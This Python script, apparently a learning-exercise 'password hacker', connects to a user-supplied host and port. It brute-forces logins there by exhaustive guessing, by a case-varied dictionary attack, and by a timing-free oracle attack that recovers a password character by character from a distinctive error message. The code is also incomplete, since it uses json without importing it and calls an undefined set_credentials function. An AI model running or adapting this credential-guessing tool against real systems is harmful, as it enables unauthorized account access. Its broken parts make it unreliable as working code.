import argparse
import itertools
import socket

"""
__author__ = "Mack_TB"
__since__ = "28/8/2021"
__version__ = "1.0.4"
"""


def get_arguments():
    parser = argparse.ArgumentParser(description="A script to guess password")
    parser.add_argument("hostname", type=str, help="IP address or domain name")
    parser.add_argument("port", type=int, help="Port number")
    return parser.parse_args()


def bruteforce(cl_socket, characters):
    i = 1
    response = ""
    while response != "Connection success!":
        for tup in itertools.product(characters, repeat=i):
            password = "".join(tup)
            cl_socket.send(password.encode())  # sending through socket

            response = cl_socket.recv(1024)  # receiving the response
            response = response.decode()  # decoding from bytes to string
            if response == "Connection success!":
                print(password)
                break
        i += 1


def bruteforce_with_dict(cl_socket, f):
    for word in f:
        password = word.rstrip("\n")
        chars = [[c] if c.isdigit() else [c, c.upper()] for c in password]
        for tup in itertools.product(*chars):  # test with different cases
            password = "".join(tup)

            cl_socket.send(password.encode())  # sending through socket

            response = cl_socket.recv(1024)  # receiving the response
            response = response.decode()  # decoding from bytes to string
            if response == "Connection success!":
                print(password)
                return


def bruteforcelp_with_dict(cl_socket, f):
    for word in f:
        password = word.rstrip("\n")
        chars = [[c] if c.isdigit() else [c, c.upper()] for c in password]
        for tup in itertools.product(*chars):  # test with different cases
            login = "".join(tup)
            credentials = set_credentials(login, "")
            json_str = json.dumps(credentials)
            cl_socket.send(json_str.encode())  # sending through socket

            response = cl_socket.recv(1024)  # receiving the response
            response = response.decode()  # decoding from bytes to string
            response = json.loads(response)
            if response["result"] == "Wrong password!":
                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                i = 0
                tmp = ""
                password = ""
                while i < len(chars):
                    for c in [chars[i], chars[i].upper()]:
                        tmp += c
                        credentials = set_credentials(login, tmp)
                        json_str = json.dumps(credentials)
                        cl_socket.send(json_str.encode())  # sending through socket

                        response = cl_socket.recv(1024)  # receiving the response
                        response = response.decode()  # decoding from bytes to string
                        response = json.loads(response)
                        # print(response)
                        if response["result"] == "Wrong password!":
                            tmp = password
                        elif response["result"] == "Exception happened during login":
                            password = tmp
                            # print(password)
                            i = 0
                        elif response["result"] == "Connection success!":
                            print(json_str)
                            return
                    i += 1
    # return None


if __name__ == "__main__":
    args = get_arguments()

    with socket.socket() as client_socket:  # creating the socket with context manager
        hostname = args.hostname
        port = args.port
        address = (hostname, port)

        client_socket.connect(address)  # connecting to the server

        # chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        # bruteforce(client_socket, chars)

        # path = "C:\\Users\\hp\\PycharmProjects\\password-hack\\hacking\\passwords.txt"
        with open("passwords.txt", "r") as file:
            bruteforce_with_dict(client_socket, file)
